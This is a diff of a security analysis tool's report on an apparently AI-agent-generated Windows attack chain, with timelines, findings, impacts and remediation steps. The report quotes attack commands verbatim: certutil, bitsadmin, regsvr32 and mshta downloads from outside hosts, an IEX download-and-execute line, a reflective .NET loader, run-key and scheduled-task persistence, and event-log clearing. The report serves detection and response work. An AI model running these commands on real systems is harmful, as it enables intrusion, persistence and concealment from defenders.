@@ -1,5 +1,5 @@
 slopmop report   <folder>
-[x] HIGH - 6 impacts: 3 high, 2 medium, 1 low
+[x] HIGH - 6 impacts: 3 high, 1 medium, 2 low
 [x] high   [!] medium   [i] low
 
 Summary
@@ -11,60 +11,57 @@ Summary
   exposed     4   Usernames 1, IP addresses 3
 
 Timeline   (step, time, role, file)
-  1  20261020_100000  script  20261020_100000_step01_recon.ps1
+  1  2026-10-20T10:00:00Z  script  20261020_100000_step01_recon.ps1
       tools       out-file, whoami, nltest, net.exe, wmic.exe
       tactics     Discovery
       wrote       recon_20261020_100030.txt
       indicators  1
-  1  20261020_100030  output  recon_20261020_100030.txt
-  2  20261020_100500  script  20261020_100500_step02_download.ps1
+  1  2026-10-20T10:00:30Z  output  recon_20261020_100030.txt
+  2  2026-10-20T10:05:00Z  script  20261020_100500_step02_download.ps1
       tools       certutil.exe, certutil, bitsadmin.exe, start-bitstransfer
       tactics     CommandAndControl
       activities  FileDownload
       transforms  Base64Decode
       indicators  4
-  3  20261020_101000  script  20261020_101000_step03_exec.ps1
+  3  2026-10-20T10:10:00Z  script  20261020_101000_step03_exec.ps1
       tools       rundll32.exe, regsvr32.exe, mshta, msbuild.exe, cmd.exe, installutil.exe
       tactics     Execution, Stealth
       activities  SignedBinaryProxyExecution
       indicators  4
-  3  20261020_101200  output  build_20261020_101200.xml
+  3  2026-10-20T10:12:00Z  output  build_20261020_101200.xml
       tactics     CommandAndControl
       activities  FileDownload
       indicators  6
-  4  20261020_101500  script  20261020_101500_step04_persist.ps1
+  4  2026-10-20T10:15:00Z  script  20261020_101500_step04_persist.ps1
       tools       schtasks.exe, rundll32.exe, reg.exe, wevtutil
       tactics     Persistence, Execution, DefenseImpairment, Stealth
       activities  SignedBinaryProxyExecution, RunKeyPersistence, ScheduledTaskCreation, EventLogClearing
-  5  20261020_102000  script  20261020_102000_step05_dotnet.ps1
+  5  2026-10-20T10:20:00Z  script  20261020_102000_step05_dotnet.ps1
       tools       new-object, [system.io.file]::writeallbytes
       tactics     CommandAndControl, Stealth
       activities  FileDownload, ReflectiveCodeLoading
       transforms  Base64Decode, Crypto:Aes, TextEncoding, Stream, GZip
       indicators  2
-  6  20261020_102500  script  20261020_102500_step06_pinvoke.ps1
+  6  2026-10-20T10:25:00Z  script  20261020_102500_step06_pinvoke.ps1
       tools       add-type, new-object, cmd.exe, whoami, iex, powershell.exe
       tactics     Execution, Discovery, CommandAndControl, Stealth
       activities  FileDownload, DownloadAndExecute, NativeApiCall, RuntimeCompilation, ProcessStart, NetworkSocket
       transforms  EncodedCommand
       indicators  4
-  6  20261020_102600  other   loader_20261020_102600.cs
+  6  2026-10-20T10:26:00Z  other   loader_20261020_102600.cs
       tactics     CommandAndControl, Stealth
       activities  FileDownload, ReflectiveCodeLoading
       indicators  3
-  7  20261020_103000  script  20261020_103000_step07_cleanup.bat
+  7  2026-10-20T10:30:00Z  script  20261020_103000_step07_cleanup.bat
       tools       certutil, wevtutil, del
       tactics     DefenseImpairment, CommandAndControl
       activities  FileDownload, EventLogClearing
       indicators  2
-  7  20261020_103500  output  proc_20261020_103500.jsonl
+  7  2026-10-20T10:35:00Z  output  proc_20261020_103500.jsonl
       tools       certutil, powershell.exe, regsvr32, schtasks, rundll32.exe, wevtutil
       tactics     Execution, Persistence, DefenseImpairment, CommandAndControl, Stealth
       activities  FileDownload, SignedBinaryProxyExecution, ScheduledTaskCreation, EventLogClearing
       indicators  3
-
-Intents   (an ARTEX run folder i<number>: the first and last time of its files, and the techniques found in them)
-  none
 
 Findings
   activities
@@ -78,7 +75,7 @@ Findings
         what  certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\Users\Public\a.b64 (20261020_100500_step02_download.ps1:1)
               bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\Users\Public\b.bin (20261020_100500_step02_download.ps1:3)
               Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\Users\Public\c.bin (20261020_100500_step02_download.ps1:4)
-              and 6 more in the saved report
+              and 6 more in the saved findings
     [x] NetworkSocket               1 line   CommandAndControl             T1095, AML.T0072
         what  $tcp = New-Object System.Net.Sockets.TcpClient("203.0.113.30", 443) (20261020_102500_step06_pinvoke.ps1:10)
     [x] RunKeyPersistence           1 line   Persistence                   T1547.001, AML.T0142
@@ -101,7 +98,7 @@ Findings
         what  rundll32.exe C:\Users\Public\a.dll,Start (20261020_101000_step03_exec.ps1:1)
               regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)
               mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)
-              and 6 more in the saved report
+              and 6 more in the saved findings
   indicators
     [x] Domain          Microsoft.Net                                        build_20261020_101200.xml
     [x] Domain          System.Net                                           build_20261020_101200.xml, loader_20261020_102600.cs
@@ -149,7 +146,7 @@ Notable files   (a finding of high severity)
   [x] output  proc_20261020_103500.jsonl
       found  FileDownload, ScheduledTaskCreation, EventLogClearing, schtasks (Persistence), wevtutil (DefenseImpairment)
 
-Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered: an earlier output does)
+Targeted   (hardcoded values: prior means no earlier output holds it, discovered means one does; subjects: each entity an activity acted on)
   Hostnames (1)
     [!] corp.example  prior  20261020_100000_step01_recon.ps1:2
         what  nltest /dclist:corp.example >> recon_20261020_100030.txt (20261020_100000_step01_recon.ps1:2)
@@ -163,6 +160,84 @@ Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered
               IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
     [!] 203.0.113.30  public  prior  20261020_102500_step06_pinvoke.ps1:10
         what  $tcp = New-Object System.Net.Sockets.TcpClient("203.0.113.30", 443) (20261020_102500_step06_pinvoke.ps1:10)
+  Url (10)
+    [x] http://203.0.113.10/a.b64      FileDownload
+        what  FileDownload: certutil.exe -urlcache -split -f http://203.0.113.10/a.b64 C:\Users\Public\a.b64 (20261020_100500_step02_download.ps1:1)
+              FileDownload: certutil -urlcache -split -f http://203.0.113.10/a.b64 C:\Users\Public\a.b64 (proc_20261020_103500.jsonl)
+    [x] http://203.0.113.10/b.bin      FileDownload
+        what  FileDownload: bitsadmin.exe /transfer job /download /priority high http://203.0.113.10/b.bin C:\Users\Public\b.bin (20261020_100500_step02_download.ps1:3)
+    [x] http://203.0.113.10/c.bin      FileDownload
+        what  FileDownload: Start-BitsTransfer -Source http://203.0.113.10/c.bin -Destination C:\Users\Public\c.bin (20261020_100500_step02_download.ps1:4)
+    [x] http://203.0.113.10/d.bin      FileDownload
+        what  FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
+    [x] http://203.0.113.20/stage.txt  FileDownload
+        what  FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
+    [x] http://203.0.113.20/next.ps1   FileDownload, DownloadAndExecute
+        what  FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
+              DownloadAndExecute: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
+    [x] http://203.0.113.20/p.bin      FileDownload
+        what  FileDownload: class L { static void Main() { var b = new WebClient().DownloadData("http://203.0.113.20/p.bin"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)
+    [x] http://203.0.113.10/c.exe      FileDownload
+        what  FileDownload: certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\c.exe (20261020_103000_step07_cleanup.bat:2)
+    [!] http://203.0.113.10/x.sct      SignedBinaryProxyExecution
+        what  SignedBinaryProxyExecution: regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)
+              SignedBinaryProxyExecution: regsvr32 /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (proc_20261020_103500.jsonl)
+    [!] http://203.0.113.10/a.hta      SignedBinaryProxyExecution
+        what  SignedBinaryProxyExecution: mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)
+  Binary (5)
+    [!] rundll32     SignedBinaryProxyExecution
+        what  SignedBinaryProxyExecution: rundll32.exe C:\Users\Public\a.dll,Start (20261020_101000_step03_exec.ps1:1)
+              SignedBinaryProxyExecution: schtasks.exe /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)
+              SignedBinaryProxyExecution: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "rundll32.exe C:\Users\Public\a.dll,Start" /f (20261020_101500_step04_persist.ps1:2)
+    [!] regsvr32     SignedBinaryProxyExecution
+        what  SignedBinaryProxyExecution: regsvr32.exe /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (20261020_101000_step03_exec.ps1:2)
+              SignedBinaryProxyExecution: regsvr32 /s /n /u /i:http://203.0.113.10/x.sct scrobj.dll (proc_20261020_103500.jsonl)
+    [!] mshta        SignedBinaryProxyExecution
+        what  SignedBinaryProxyExecution: mshta http://203.0.113.10/a.hta (20261020_101000_step03_exec.ps1:3)
+    [!] MSBuild      SignedBinaryProxyExecution
+        what  SignedBinaryProxyExecution: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\build_20261020_101200.xml (20261020_101000_step03_exec.ps1:4)
+    [!] InstallUtil  SignedBinaryProxyExecution
+        what  SignedBinaryProxyExecution: cmd.exe /c "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /U C:\Users\Public\a.dll" (20261020_101000_step03_exec.ps1:5)
+  Value (1)
+    [x] Updater  RunKeyPersistence
+        what  RunKeyPersistence: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "rundll32.exe C:\Users\Public\a.dll,Start" /f (20261020_101500_step04_persist.ps1:2)
+  Runs (1)
+    [x] rundll32.exe C:\Users\Public\a.dll,Start  RunKeyPersistence, ScheduledTaskCreation
+        what  RunKeyPersistence: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "rundll32.exe C:\Users\Public\a.dll,Start" /f (20261020_101500_step04_persist.ps1:2)
+              ScheduledTaskCreation: schtasks.exe /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)
+              ScheduledTaskCreation: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
+  Task (1)
+    [x] Updater  ScheduledTaskCreation
+        what  ScheduledTaskCreation: schtasks.exe /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)
+              ScheduledTaskCreation: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
+  Log (2)
+    [x] Security  EventLogClearing
+        what  EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)
+              EventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)
+    [x] System    EventLogClearing
+        what  EventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)
+  Call (3)
+    [!] Assembly]::Load    ReflectiveCodeLoading
+        what  ReflectiveCodeLoading: $asm = [System.Reflection.Assembly]::Load($out.ToArray()) (20261020_102000_step05_dotnet.ps1:11)
+    [!] EntryPoint.Invoke  ReflectiveCodeLoading
+        what  ReflectiveCodeLoading: $asm.EntryPoint.Invoke($null, @(,[string[]]@())) (20261020_102000_step05_dotnet.ps1:12)
+    [!] Assembly.Load      ReflectiveCodeLoading
+        what  ReflectiveCodeLoading: class L { static void Main() { var b = new WebClient().DownloadData("http://203.0.113.20/p.bin"); Assembly.Load(b).EntryPoint.Invoke(null, null); } } (loader_20261020_102600.cs:4)
+  Function (2)
+    [!] VirtualAlloc  NativeApiCall
+        what  NativeApiCall: [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)
+    [!] CreateThread  NativeApiCall
+        what  NativeApiCall: [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)
+  Library (1)
+    [!] kernel32.dll  NativeApiCall
+        what  NativeApiCall: [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)
+              NativeApiCall: [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)
+  Program (1)
+    [!] cmd.exe  ProcessStart
+        what  ProcessStart: [System.Diagnostics.Process]::Start("cmd.exe", "/c whoami") (20261020_102500_step06_pinvoke.ps1:11)
+  Host (1)
+    [x] 203.0.113.30  NetworkSocket
+        what  NetworkSocket: $tcp = New-Object System.Net.Sockets.TcpClient("203.0.113.30", 443) (20261020_102500_step06_pinvoke.ps1:10)
 
 Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
   Usernames (1)
@@ -179,7 +254,6 @@ Impact
       what     RunKeyPersistence: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "rundll32.exe C:\Users\Public\a.dll,Start" /f (20261020_101500_step04_persist.ps1:2)
                ScheduledTaskCreation: schtasks.exe /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)
                ScheduledTaskCreation: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
-               schtasks: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
       basis    RunKeyPersistence, ScheduledTaskCreation, Persistence tools
   [x] Outside hosts contacted
       Files or commands were fetched from, or a channel was opened to, hosts outside the environment. Affected: 203.0.113.10, 203.0.113.20, 203.0.113.30.
@@ -190,7 +264,7 @@ Impact
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 5 more in the saved report
+               and 4 more in report.json
       basis    FileDownload, DownloadAndExecute, NetworkSocket
   [x] Defences and logging impaired
       Logs were cleared or security tooling was interfered with. Records of this period are incomplete.
@@ -198,7 +272,6 @@ Impact
       what     EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)
                EventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)
                EventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)
-               wevtutil: wevtutil cl Security (proc_20261020_103500.jsonl)
       basis    EventLogClearing, DefenseImpairment tools
   [!] Code run outside normal controls
       Code was run in ways that avoid application control and leave little on disk.
@@ -209,9 +282,9 @@ Impact
                NativeApiCall: [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); (20261020_102500_step06_pinvoke.ps1:5)
                NativeApiCall: [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i); (20261020_102500_step06_pinvoke.ps1:6)
                SignedBinaryProxyExecution: rundll32.exe C:\Users\Public\a.dll,Start (20261020_101000_step03_exec.ps1:1)
-               and 11 more in the saved report
+               and 11 more in report.json
       basis    ReflectiveCodeLoading, NativeApiCall, SignedBinaryProxyExecution, RuntimeCompilation, DownloadAndExecute, ProcessStart
-  [!] Commands generated by an AI agent
+  [i] Commands generated by an AI agent
       The scripts were written by an AI agent, which is the premise of this tool. Generated commands differ from run to run, so a detection that matches exact text misses them.
       basis    the premise of the tool
       files    20261020_100000_step01_recon.ps1, 20261020_100500_step02_download.ps1, 20261020_101000_step03_exec.ps1 and 7 more
@@ -232,7 +305,6 @@ Remediation   (most urgent first)
       what     RunKeyPersistence: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "rundll32.exe C:\Users\Public\a.dll,Start" /f (20261020_101500_step04_persist.ps1:2)
                ScheduledTaskCreation: schtasks.exe /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)
                ScheduledTaskCreation: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
-               schtasks: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
       basis    RunKeyPersistence, ScheduledTaskCreation, Persistence tools
   [x] Block and hunt the infrastructure
       Block the addresses and domains in the findings, and search proxy, DNS and firewall logs for other hosts that reached them.
@@ -243,7 +315,7 @@ Remediation   (most urgent first)
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 5 more in the saved report
+               and 4 more in report.json
       basis    FileDownload, DownloadAndExecute, NetworkSocket
   [!] Find the delivered files
       Collect the files that were downloaded, dropped or loaded, hash them, and search every host for the same hashes.
@@ -254,7 +326,7 @@ Remediation   (most urgent first)
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 20 more in the saved report
+               and 18 more in report.json
       basis    FileDownload, DownloadAndExecute, ReflectiveCodeLoading, SignedBinaryProxyExecution, RuntimeCompilation, NativeApiCall, ProcessStart
   [!] Recover the missing logs
       Treat local logs as incomplete, and recover the period from a central collector or a backup.
@@ -262,7 +334,6 @@ Remediation   (most urgent first)
       what     EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)
                EventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)
                EventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)
-               wevtutil: wevtutil cl Security (proc_20261020_103500.jsonl)
       basis    EventLogClearing, DefenseImpairment tools
   [i] Follow what was enumerated
       Use what was listed to predict targets: check those identities, vaults and hosts for later activity.
@@ -363,13 +434,13 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
       for  FileDownload: url http://203.0.113.10/a.b64, url http://203.0.113.10/b.bin, url http://203.0.113.10/c.bin, url http://203.0.113.10/d.bin, url http://203.0.113.20/stage.txt, url http://203.0.113.20/next.ps1, url http://203.0.113.20/p.bin, url http://203.0.113.10/c.exe
            DownloadAndExecute: url http://203.0.113.20/next.ps1
            NetworkSocket: host 203.0.113.30
-  [!] AML.M0020 Generative AI Guardrails                         AML.T0102
+  [i] AML.M0020 Generative AI Guardrails                         AML.T0102
       Guardrails are safety controls placed between users, tools, and generative AI models to evaluate prompts, retrieved context, model outputs, and agent actions before they are accepted, executed, or shown to a user.
       for  Commands generated by an AI agent
-  [!] AML.M0022 Generative AI Model Alignment                    AML.T0102
+  [i] AML.M0022 Generative AI Model Alignment                    AML.T0102
       Generative AI Model Alignment is the process of training or fine-tuning a generative model to guide its output toward a set of human values, goals, or ethical principles.
       for  Commands generated by an AI agent
 
-[x] HIGH - 6 impacts: 3 high, 2 medium, 1 low
+[x] HIGH - 6 impacts: 3 high, 1 medium, 2 low
 -> saved to <out>: report.txt, report.md, report.html, files.json, trace.json, intents.json, findings.json, targeted.json, exposure.json, report.json
 -> one section: slopmop -inputdir <folder> report impact
